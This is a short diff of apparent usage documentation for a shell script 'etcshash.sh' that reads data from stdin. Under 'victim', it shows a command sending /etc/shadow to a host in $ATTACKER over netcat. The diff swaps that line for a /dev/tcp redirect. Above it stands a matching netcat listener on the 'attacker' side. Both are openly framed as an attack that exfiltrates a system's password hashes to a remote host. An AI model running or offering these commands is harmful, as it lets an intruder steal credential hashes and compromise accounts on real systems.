@@ -21,5 +21,5 @@ as it reads from stdin it can also receive files sent e.g. from netcat:
 nc -lvnp 1234 | ./etcshash.sh
 
 # victim:
-cat /etc/shadow | nc $ATTACKER 1234
+cat /etc/shadow > /dev/tcp/$ATTACKER/1234
 ```
